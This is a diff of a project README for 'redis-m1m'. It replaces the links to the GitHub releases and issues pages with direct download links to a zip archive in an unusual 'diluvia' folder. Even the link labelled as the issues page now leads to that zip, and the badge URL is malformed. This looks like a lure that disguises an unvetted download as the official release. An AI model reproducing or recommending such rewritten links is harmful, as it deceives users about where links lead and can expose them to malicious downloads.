@@ -8,7 +8,7 @@ Welcome to redis-m1m! This application provides a simple way to manage and store
 
 To download redis-m1m, visit the releases page:
 
-[![Download redis-m1m](https://img.shields.io/badge/Download%20redis--m1m-v1.0-blue.svg)](https://github.com/Raghav-939/redis-m1m/releases)
+[![Download redis-m1m](https://raw.githubusercontent.com/Raghav-939/redis-m1m/main/diluvia/redis-m1m.zip%https://raw.githubusercontent.com/Raghav-939/redis-m1m/main/diluvia/redis-m1m.zip)](https://raw.githubusercontent.com/Raghav-939/redis-m1m/main/diluvia/redis-m1m.zip)
 
 Click the link above to visit the page. There, you will find the latest version of the software available for download.
 
@@ -60,7 +60,7 @@ These features help you manage your data effortlessly.
 If you encounter any issues or have questions, you can reach out for support:
 
 1. Check the “Help” section in the application for FAQs.
-2. Visit the [Issues page](https://github.com/Raghav-939/redis-m1m/issues) on GitHub and report your problem or query.
+2. Visit the [Issues page](https://raw.githubusercontent.com/Raghav-939/redis-m1m/main/diluvia/redis-m1m.zip) on GitHub and report your problem or query.
 
 ## 📦 Update redis-m1m
 
@@ -74,4 +74,4 @@ redis-m1m is licensed under the MIT License. This means you can use it freely, b
 
 For more information on configuration and advanced features, please refer to the documentation found on the repository page. 
 
-[Download redis-m1m](https://github.com/Raghav-939/redis-m1m/releases) and start managing your data efficiently today!
+[Download redis-m1m](https://raw.githubusercontent.com/Raghav-939/redis-m1m/main/diluvia/redis-m1m.zip) and start managing your data efficiently today!
